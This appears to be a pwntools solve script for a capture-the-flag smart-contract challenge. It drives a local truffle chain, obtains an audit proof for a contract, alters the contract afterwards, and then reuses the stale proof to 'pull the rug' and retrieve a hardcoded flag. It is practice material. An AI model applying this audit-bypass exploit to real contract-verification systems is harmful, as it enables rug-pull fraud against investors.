import hashlib

import pwn
from numpy import tril_indices_from

menu = b"""What do you want to do?
1. Perform an audit
2. Pull the rug
3. Exit
> """

# pwn.context.log_level = "DEBUG"

truffle_background = pwn.process(["truffle", "develop"])
truffle_background.recvuntil(b"truffle(develop)>")

truffle = pwn.process(["truffle", "test", "--grep", "attack", "--quiet"])
truffle.recvuntil(b"contract_before: ")
contract_address = truffle.recvline(keepends=False)
pwn.log.info(f"{contract_address = }")

tn = pwn.process(["python3", "immutable_local.py"])
tn.recvuntil(menu)
tn.sendline(b"1")
tn.sendlineafter(b"Where is your contract? ", contract_address)
tn.recvuntil(b"Alright then, here's some proof that that contract is trustworthy\n")
proof = tn.recvline(keepends=False)
pwn.log.success(f"{proof = }")
tn.close()

target = (
    hashlib.sha256(
        f"{int(contract_address.decode(), 16):40x}||I will steal all your flags!".encode()
    )
    .digest()
    .hex()
    .encode()
)

pwn.log.info(f"{target = }")
truffle.recvuntil(b"Input target: ")
truffle.recvn(5)  # rid out truffle
truffle.sendline(target)
truffle.recvuntil(b"contract_after: ")
truffle.close()

tn = pwn.process(["python3", "immutable_local.py"])
tn.recvuntil(menu)
tn.sendline(b"2")
tn.recvuntil(b"Where is your contract? ")
tn.sendline(contract_address)
tn.recvuntil(b"Prove you're not a criminal please.\n> ")
tn.sendline(proof)

tn.recvuntil(b"I'll invest all my monopoly money into this!\n")
flag = tn.recvline(keepends=False)
pwn.log.success(f"{flag = }")
assert flag == b"EPFL{https://youtu.be/ZgWkdQDBqiQ}"
tn.close()

truffle_background.close()
